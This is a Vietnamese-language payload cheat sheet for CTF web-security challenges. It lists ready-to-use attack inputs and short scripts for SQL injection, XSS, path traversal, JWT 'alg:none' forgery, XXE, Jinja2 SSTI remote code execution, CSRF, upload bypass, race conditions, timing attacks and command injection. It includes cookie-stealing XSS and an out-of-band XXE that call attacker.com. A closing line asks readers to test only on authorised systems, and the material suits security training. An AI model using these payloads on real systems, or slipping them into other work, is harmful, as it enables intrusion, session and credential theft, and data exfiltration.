# Cẩm nang Payload CTF Tổng hợp (Cheat Sheet)

Sổ tay tra cứu siêu tốc các loại Payload khai thác thường được sử dụng nhất trong các bài thi CTF bảo mật.

## 🔴 SQL Injection (SQLi)

### Payload Bypass đăng nhập cơ bản
```sql
' OR '1'='1' --
' OR 1=1 --
admin' --
admin' #
' OR 'a'='a
```

### Dò quét bằng mệnh đề UNION (Union-Based)
```sql
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT username,password FROM users --
```

### Tiêm mù bằng câu lệnh Logic (Boolean-Based Blind SQLi)
```sql
' OR (SELECT SUBSTR(value,1,1) FROM secrets)='F' --
' AND 1=1 --  (Trả về đúng - Trang web hiển thị bình thường)
' AND 1=2 --  (Trả về sai - Trang web báo lỗi hoặc mất nội dung)
```

### Tiêm mù bằng độ trễ thời gian (Time-Based Blind SQLi)
```sql
' OR SLEEP(5) --
' AND (SELECT SLEEP(5) FROM users WHERE username='admin') --
```

## 🟠 XSS (Cross-Site Scripting)

### XSS cổ điển
```html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Payload đánh cắp Cookie
```html
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
```

### Kỹ thuật Bypass bộ lọc (WAF/Filter Bypass)
```html
<ScRiPt>alert(1)</sCrIpT>
<img src=x onerror="alert(1)">
<svg/onload=alert(1)>
<iframe src="javascript:alert(1)">
```

## 🟡 Path Traversal (Duyệt thư mục)

### Lùi cấp cơ bản
```text
../../../etc/passwd
..\..\..\..\windows\system32\config\sam
```

### Bypass bằng URL Encoding
```text
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
```

### Đánh lừa bằng Ký tự Null (Null Byte) (Chủ yếu trên các hệ thống cũ)
```text
../../../etc/passwd%00
```

## 🟢 Thao túng JWT

### Tấn công Algorithm Confusion (alg: "none")
```json
Header: {"alg":"none","typ":"JWT"}
Payload: {"sub":"admin","role":"admin"}
```

### Script Python tự động sinh Token giả
```python
import base64, json

def base64url(data):
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip('=')

h = base64url('{"alg":"none","typ":"JWT"}')
p = base64url('{"sub":"admin","role":"admin"}')
token = f"{h}.{p}."  # Cố tình bỏ trống phần chữ ký!
```

## 🔵 XXE (XML External Entity)

### Đọc file hệ thống cơ bản
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Ví dụ đọc Flag
```xml
<?xml version="1.0"?>
<!DOCTYPE products [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<products>
  <name>&xxe;</name>
</products>
```

### Nâng cao: Đánh cắp data bằng Out-of-Band (OOB XXE)
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
```

## 🟣 SSTI (Server-Side Template Injection)

### Jinja2 (Python/Flask)
```jinja2
{{7*7}}
{{config}}
{{config['FLAG']}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Payload thực thi mã từ xa (RCE)
```jinja2
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
```

## 🟤 CSRF (Cross-Site Request Forgery)

### Mẫu HTML Form tự động submit
```html
<html>
<body>
<form id="csrf" action="http://target.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="9000">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

### Giả dạng bằng thẻ Ảnh (Cho phương thức GET)
```html
<img src="http://target.com/transfer?to=attacker&amount=9000">
```

## ⚫ GraphQL

### Truy vấn nội quan (Introspection Query - Lấy cấu trúc API)
```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

### Truy vấn khai thác IDOR
```graphql
{
  user(id: 1) {
    id
    username
    email
    secret
  }
}
```

### Truy vấn hàng loạt (Batch Query - Spam Request)
```graphql
{
  user1: user(id: 1) { username secret }
  user2: user(id: 2) { username secret }
  user3: user(id: 3) { username secret }
}
```

## 🔴 Bypass Upload File (Tải lên mã độc)

### Kỹ thuật nối đuôi kép (Double Extension)
```text
shell.php.jpg
shell.php.png
shell.jsp.jpg
```

### Bypass qua kiểm tra định dạng Header (Content-Type)
Dùng Burp chặn Request và sửa:
```http
Content-Type: image/jpeg
(nhưng ruột thực tế vẫn tải lên file .php)
```

### Kỹ thuật nhồi Magic Bytes
Chèn chuỗi `GIF89a` hoặc Header của PNG vào vị trí đầu tiên của file PHP để lừa cơ chế kiểm tra nội dung file (MIME sniffer).

### Bơm Ký tự Null (Null Byte)
```text
shell.php%00.jpg
```

## 🟠 Khai thác lỗi tương tranh (Race Condition)

### Kịch bản Python đa luồng (Multi-threading)
```python
import threading, requests

url = "http://target.com/redeem"
session = requests.Session()

def exploit():
    session.post(url)

# Chạy 10 request song song
threads = [threading.Thread(target=exploit) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()
```

### Kịch bản Bash Script (Dùng Job Control)
```bash
for i in {1..10}; do
  curl -X POST http://target.com/redeem &
done
wait
```

## 🟡 Timing Attack (Tấn công Kênh thời gian)

### Kịch bản Python dò từng ký tự
```python
import requests, time, string

url = "http://target.com/validate"
key = ""
charset = "0123456789abcdef"

for pos in range(10):
    timings = {}
    for char in charset:
        test = key + char + "0" * (9 - pos)
        start = time.time()
        requests.post(url, data={"key": test})
        timings[char] = time.time() - start
    
    key += max(timings, key=timings.get)
    print(f"Key hiện tại: {key}")
```

## 🟢 IDOR (Insecure Direct Object Reference)

### Thao túng trực tiếp trên URL
```text
/user/1
/note/3
/api/flag?uid=1
/document?id=100
```

### Thao túng thông qua Cookie / Header HTTP
```http
Cookie: user_id=1
X-User-ID: 1
Authorization: Bearer [token_with_admin_id]
```

## 🔵 Parameter Tampering (Giả mạo tham số)

### Sửa tham số truyền trên URL
```text
?role=admin
?admin=true
?isAdmin=1
?user_type=administrator
```

### Dùng Inspect sửa các Form ẩn (Hidden Form Fields)
```html
<input type="hidden" name="price" value="0.01">
<input type="hidden" name="role" value="admin">
<input type="hidden" name="discount" value="100">
```

## 🟣 Thao túng Cookie

### Bằng Trình duyệt (DevTools F12)
```text
1. Nhấn F12 → Chuyển sang tab Application → Mục Cookies
2. Chỉnh sửa giá trị (Value) của Cookie
3. F5 Refresh lại trang
```

### Bằng cURL
```bash
curl -H "Cookie: role=admin; user=alice" http://target.com/
```

### Bằng Python
```python
import requests
cookies = {'role': 'admin', 'user': 'alice'}
requests.get('http://target.com/', cookies=cookies)
```

## 🟤 Lộ lọt thông tin (Information Disclosure)

### Các file cấu hình nhạy cảm cần soi
```text
/robots.txt
/.git/
/.env
/backup/
/.DS_Store
/config.php.bak
/web.config
/.htaccess
```

### Các đường dẫn hay bật Directory Listing (Liệt kê thư mục)
```text
/admin/
/backup/
/uploads/
/files/
```

## ⚫ Bypass chức năng Reset Mật khẩu

### Mẫu Token yếu, dễ đoán (Predictable Tokens)
```text
username + năm hiện tại (VD: alice2024)
username + 123 (VD: alice123)
MD5(username)
```

### Lỗ hổng tái sử dụng Token (Token Reuse)
```text
Dùng 1 token duy nhất đổi mật khẩu được nhiều lần
Lấy token của user này áp dụng cho user khác
```

## 🔴 Command Injection (Thực thi lệnh hệ thống OS)

### Kỹ thuật nhồi lệnh cơ bản
```bash
; ls
| whoami
& cat /etc/passwd
`id`
$(whoami)
```

### Lách các bộ lọc khoảng trắng (Bypass Filters)
```bash
cat</etc/passwd
cat${IFS}/etc/passwd
c'a't /etc/passwd
```

## 🟠 Các kỹ thuật Encoding nhào nặn Payload

### URL Encoding cơ bản
```text
%20 = Khoảng trắng
%2F = Dấu gạch chéo /
%3C = Dấu nhỏ hơn <
%3E = Dấu lớn hơn >
```

### Mã hóa Kép (Double Encoding - lách bộ lọc WAF)
```text
%252F  (Khi decode ra %2F, decode lần nữa ra /)
%253C  (Khi decode ra %3C, decode lần nữa ra <)
```

### Base64 Encoding
```bash
echo "admin' --" | base64
YWRtaW4nIC0tCg==
```

## 🟡 Các cước pháp cURL hữu ích trong thực chiến

### Nã POST Request cơ bản
```bash
curl -X POST -d "username=admin&password=pass" http://target.com/login
```

### Gửi Request kèm Cookie
```bash
curl -b "session=abc123" http://target.com/dashboard
```

### Đăng nhập & Lưu trữ Cookie vào file cục bộ
```bash
curl -c cookies.txt -d "user=admin&pass=pass" http://target.com/login
curl -b cookies.txt http://target.com/dashboard
```

### Gửi kèm Header tùy chỉnh (VD: JWT Token)
```bash
curl -H "Authorization: Bearer token123" http://target.com/api
```

### Đo thời gian (Timing) phản hồi
```bash
time curl -X POST -d "key=test" http://target.com/
```

## 🟢 Mẹo hay với Burp Suite

### Repeater (Lặp lại & Sửa Request)
```text
Ctrl+R         - Đẩy request đang bắt sang thẻ Repeater
Ctrl+Space     - Phát yêu cầu đi ngay
Ctrl+Shift+R   - Nhanh chóng đổi phương thức (Từ GET sang POST và ngược lại)
```

### Intruder (Phá Pass/Brute-force)
```text
1. Bôi đen vị trí chuỗi cần Brute-force.
2. Nhấn nút "Add §" để chốt mục tiêu.
3. Chuyển sang tab Payload, chọn bộ từ điển (Wordlist).
4. Nhấn Start Attack!
```

### Decoder (Con dao mã hóa)
```text
Ctrl+Shift+D   - Mở cửa sổ Decoder
Hỗ trợ Encode/Decode 2 chiều: Base64, URL, HTML Entity, v.v.
```

## 🔵 Template Python Requests siêu tốc

```python
import requests

# Tạo Session để nó tự nhớ và giữ Cookie cho mình
s = requests.Session()

# 1. Bypass Đăng nhập
r = s.post('http://target.com/login', data={
    'username': 'admin',
    'password': 'password'
})

# 2. Xâm nhập các trang cần quyền
r = s.get('http://target.com/dashboard')

# 3. Request API kèm theo JWT Header tự chế
headers = {'Authorization': 'Bearer token123'}
r = s.get('http://target.com/api', headers=headers)

# 4. Gửi JSON Request (VD: GraphQL)
r = s.post('http://target.com/api', json={
    'query': '{ user(id: 1) { secret } }'
})

print(r.text)   # Xem dạng văn bản
print(r.json()) # Xem dạng JSON
```

---

## 📝 Ghi chú cuối cùng

- Tuyệt đối chỉ thử nghiệm Payload trên những hệ thống mà bạn làm chủ hoặc được cho phép (Nhà vô địch không bao giờ ngồi tù).
- Hãy luôn bắt đầu với những Payload ngây thơ, đơn giản nhất trước khi dùng tới đao to búa lớn.
- Khéo léo sử dụng Encoding nếu bạn nghi ngờ Payload đang bị tường lửa (WAF) chém.
- Soi thật kỹ mã phản hồi HTTP (200, 403, 500), thời gian phản hồi (Timing) và các thông báo lỗi văng ra. Đôi khi manh mối nằm ngay trong lỗi.
- Viết Report/Ghi chú ngay những gì bạn tìm thấy!

**Chúc bạn hack vui vẻ! 🚩**
